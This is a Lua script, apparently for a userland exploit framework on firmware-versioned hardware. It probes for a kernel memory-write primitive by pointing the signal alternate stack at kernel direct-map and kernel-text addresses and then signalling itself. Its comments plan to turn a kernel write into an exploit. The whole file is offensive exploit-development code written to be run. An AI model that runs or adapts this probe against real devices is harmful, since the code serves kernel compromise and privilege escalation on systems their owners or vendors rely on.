-- 14.10 Recon Probe 25b: Kernel altstack with SIG_IGN ONLY
-- Probe 25 crashed because signal delivered despite sigprocmask block
-- New strategy: ONLY use SIG_IGN, never a real handler
-- SIG_IGN should never build a signal frame or touch the altstack
-- If SIG_IGN is truly safe, we can test kernel altstack without risk

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: SIGALT IGN ONLY ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_sigprocmask = 340,
    sc_sigpending = 343,
    sc_kill = 37,
    sc_getpid = 20,
})

local SA_SIZE = 64
local SS_SIZE = 32
local SA_ONSTACK = 0x0001
local SA_SIGINFO = 0x0040
local SS_DISABLE = 4
local STACK_SZ = 16384

local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(SS_SIZE)
local ss_old = memory.alloc(SS_SIZE)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: SIG_IGN baseline on user altstack
-- ============================================================
log("")
log("--- PART 1: SIG_IGN + user altstack ---")

local user_stack = memory.alloc(STACK_SZ)
for i = 0, STACK_SZ - 4, 4 do
    memory.write_dword(user_stack + i, 0x11110000 + i)
end

-- Set altstack to user buffer
memory.write_qword(ss_new, user_stack)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)
local ss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  set user altstack: " .. tostring(ss_ok))

-- Set SIGUSR1 to SIG_IGN with SA_ONSTACK
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN = 1
memory.write_dword(sa_new + 8, SA_ONSTACK)
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  set SIGUSR1 = IGN + ONSTACK")

-- Verify handler
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_old + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
local h_lo = memory.read_dword(sa_old):tonumber()
local h_hi = memory.read_dword(sa_old + 4):tonumber()
local h_fl = memory.read_dword(sa_old + 8):tonumber()
log(string.format("  verify: handler=0x%08x%08x flags=0x%x", h_hi, h_lo, h_fl))

-- Send SIGUSR1 to self
local k_ok, k_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill(SIGUSR1): " .. (k_ok and "rv=" .. k_ret:tonumber() or "ERR"))

-- Check if altstack was modified
local modified = 0
local first_mod = -1
for i = 0, STACK_SZ - 4, 4 do
    local v = memory.read_dword(user_stack + i):tonumber()
    if v ~= 0x11110000 + i then
        modified = modified + 1
        if first_mod < 0 then first_mod = i end
    end
end
log("  user altstack modified dwords: " .. modified)
if first_mod >= 0 then
    log("  first mod at offset: " .. first_mod)
end

local alive = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive))

-- ============================================================
-- PART 2: SIG_IGN + kernel DMAP altstack
-- ============================================================
log("")
log("--- PART 2: SIG_IGN + kernel DMAP altstack ---")

-- Disable current altstack first
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Set altstack to kernel DMAP
memory.write_dword(ss_new, 0x10000000)      -- lo
memory.write_dword(ss_new + 4, 0xFFFFF800)  -- hi = DMAP
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)

local kss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  set kernel altstack: " .. tostring(kss_ok))

-- Verify it was set
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
local v_lo = memory.read_dword(ss_old):tonumber()
local v_hi = memory.read_dword(ss_old + 4):tonumber()
local v_fl = memory.read_dword(ss_old + 16):tonumber()
log(string.format("  verify: sp=0x%08x%08x flags=0x%x", v_hi, v_lo, v_fl))

-- SIGUSR1 already SIG_IGN + SA_ONSTACK from Part 1
-- Send it
local k2_ok, k2_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill(SIGUSR1) with kernel altstack: " ..
    (k2_ok and "rv=" .. k2_ret:tonumber() or "ERR"))

local alive2 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive2))

-- ============================================================
-- PART 3: SIG_IGN + kernel TEXT altstack
-- ============================================================
log("")
log("--- PART 3: SIG_IGN + kernel TEXT altstack ---")

memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

memory.write_dword(ss_new, 0x80200000)      -- lo = kernel text
memory.write_dword(ss_new + 4, 0xFFFFFFFF)  -- hi
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)

local kt_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  set kernel text altstack: " .. tostring(kt_ok))

local k3_ok, k3_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill(SIGUSR1) with ktext altstack: " ..
    (k3_ok and "rv=" .. k3_ret:tonumber() or "ERR"))

local alive3 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive3))

-- ============================================================
-- PART 4: SIG_DFL + kernel altstack (SIGUSR2)
-- SIG_DFL for SIGUSR2 = terminate process
-- If the signal is delivered, process dies (we lose connection)
-- If kernel detects bad altstack in sendsig, it may:
--   a) kill the process (SIGKILL) — we lose connection
--   b) fall back to normal stack — we survive
--   c) write to kernel memory — exploit!
-- ============================================================
log("")
log("--- PART 4: SIG_DFL + kernel altstack (SIGUSR2) ---")
log("  WARNING: this may kill the process")

-- Set kernel altstack (DMAP)
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

memory.write_dword(ss_new, 0x10000000)
memory.write_dword(ss_new + 4, 0xFFFFF800)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- SIGUSR2 = signal 31, default action = terminate
-- Set to SIG_DFL with SA_ONSTACK
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 0)  -- SIG_DFL = 0
memory.write_dword(sa_new + 8, SA_ONSTACK)
pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

-- Send SIGUSR2 — if SIG_DFL=terminate, kernel builds no frame
-- It just calls sigexit() which doesn't need the altstack
local k4_ok, k4_ret = pcall(function() return syscall.sc_kill(pid, 31) end)
log("  kill(SIGUSR2,DFL): " ..
    (k4_ok and "rv=" .. k4_ret:tonumber() or "ERR"))

-- If we're still here, SIG_DFL terminate didn't work
local alive4 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive4))

-- ============================================================
-- PART 5: Test sigprocmask — does blocking actually work?
-- ============================================================
log("")
log("--- PART 5: sigprocmask test ---")

-- Disable altstack, restore handlers
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

-- Test: block ALL signals, read old mask
local mask = memory.alloc(16)
local old_mask = memory.alloc(16)
memory.write_qword(mask, 0xFFFFFFFF)
memory.write_qword(mask + 8, 0xFFFFFFFF)

local pm_ok, pm_ret = pcall(function()
    return syscall.sc_sigprocmask(1, mask, old_mask) -- SIG_BLOCK=1
end)
log("  sigprocmask(BLOCK,all): " ..
    (pm_ok and "rv=" .. pm_ret:tonumber() or "ERR"))

local om_lo = memory.read_dword(old_mask):tonumber()
local om_hi = memory.read_dword(old_mask + 4):tonumber()
log(string.format("  old mask: 0x%08x%08x", om_hi, om_lo))

-- Read current mask with SIG_SETMASK=3 and NULL new
-- Actually can't pass NULL... read via sigpending
local pend = memory.alloc(16)
local sp_ok, sp_ret = pcall(function()
    return syscall.sc_sigpending(pend)
end)
if sp_ok then
    local p_lo = memory.read_dword(pend):tonumber()
    log(string.format("  pending: 0x%08x", p_lo))
end

-- Unblock all
memory.write_qword(mask, 0)
memory.write_qword(mask + 8, 0)
pcall(function() syscall.sc_sigprocmask(3, mask, old_mask) end) -- SIG_SETMASK=3
local bm_lo = memory.read_dword(old_mask):tonumber()
local bm_hi = memory.read_dword(old_mask + 4):tonumber()
log(string.format("  blocked mask was: 0x%08x%08x", bm_hi, bm_lo))

-- Cleanup
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

log("")
log("=== SIGALT IGN DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
